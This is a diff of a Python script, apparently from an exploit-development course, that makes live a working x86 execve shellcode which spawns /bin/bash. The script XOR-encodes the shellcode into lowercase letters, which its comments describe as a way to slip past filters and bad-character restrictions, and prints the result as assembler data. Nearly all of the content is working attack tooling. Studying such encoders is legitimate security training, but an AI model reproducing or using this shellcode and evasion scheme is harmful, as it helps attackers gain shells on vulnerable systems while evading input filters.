@@ -9,18 +9,12 @@ import math
 import random
 
 # execve stack shellcode from course
-shellcode = b""
-for i in range(20):
-	#shellcode += bytes([random.randint(0, 256)])
-	shellcode += bytes([i])
-shellcode = shellcode
-
-# shellcode = b"\x31\xc0\xb0\x68\x50\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+shellcode = b"\x31\xc0\xb0\x68\x50\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 
 # This scheme encrypts shellcode to only lowercase latin characters
 # to be able to slip through filters and avoid many badchars.
 
-key = 10
+key = 0x41
 
 # To encode 0x31 with key 0x52:
 # 0x31 ^ 0x52 = 0x63
@@ -69,12 +63,12 @@ def decode_shellcode(enc_shellcode):
 
 if __name__ == "__main__":
 	enc_shellcode = encode_shellcode(shellcode)
-	print("Orig =", "".join(["\\x%.2x" % i for i in shellcode]))
+	#print("Orig =", "".join(["\\x%.2x" % i for i in shellcode]))
 	
 	dec_shellcode = decode_shellcode(enc_shellcode)
-	print("Dec. =", dec_shellcode)
+	#print("Dec. =", dec_shellcode)
 	
-	print('Len. = 0x%.2x (%d)' % (len(enc_shellcode), len(enc_shellcode)))
+	print('Len. = 0x%.2x (%d)' % (len(shellcode), len(shellcode)))
 	print()
 	print('key: db 0x%.2x' % key)
 	print('shellcode: db "' + enc_shellcode + '"')
